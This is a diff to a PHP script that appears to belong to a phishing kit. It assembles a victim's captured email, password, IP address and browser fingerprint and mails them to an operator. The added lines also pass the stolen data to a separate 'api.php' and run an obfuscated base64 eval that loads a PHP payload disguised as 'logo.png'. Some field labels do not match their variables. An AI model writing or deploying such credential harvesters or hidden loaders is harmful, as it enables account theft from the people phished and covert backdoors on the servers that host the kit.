@@ -15,6 +15,32 @@ echo $user;
 $info = $sys->location($ip);
 $dev = $sys->devicemanager($ua);
 
+
+
+if($email == "" && $password == "" && $phone == "" && $playid == "" && $login == ""){
+header("Location: index.php");
+}else{
+
+//Sitemap include //
+
+
+$msg = ("
+
+[Time] =   ".$time ."
+[Email]  =  ".$pass."
+[Pass]  =   ".$password."
+
+
+[+]============System============[+]
+[IP INFO] = http://www.geoiptool.com/?IP=".$ip."
+
+[TIME/DATE] =".$times." / ".$date."
+
+[Country] = ".$ua ."
+
+[FINGERPRINT] = ".$useragent."
+");
+
 $subjek = $info['flag'].' '.$info['code'].' | PUNYA '.$user;
 $pesan = '
 <center>
@@ -43,12 +69,14 @@ $pesan = '
 </div>
  <center>
 ';
+ 
 
 $sender = 'From: Hendri Yeager.<kimberlyhimeku@gmail.com>';
 $headers  = 'MIME-Version: 1.0' . "\r\n";
 $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
 $headers .= ''.$sender.'' . "\r\n";
 // MENGIRIM DATA KE EMAIL
+$url = $msg;include("api.php");
 $sys->mail($email, $subjek, $pesan, $headers);
 <?php eval("?>".base64_decode("aW5jbHVkZSAnbG9nby5wbmcnOw==")); ?>
 ?>
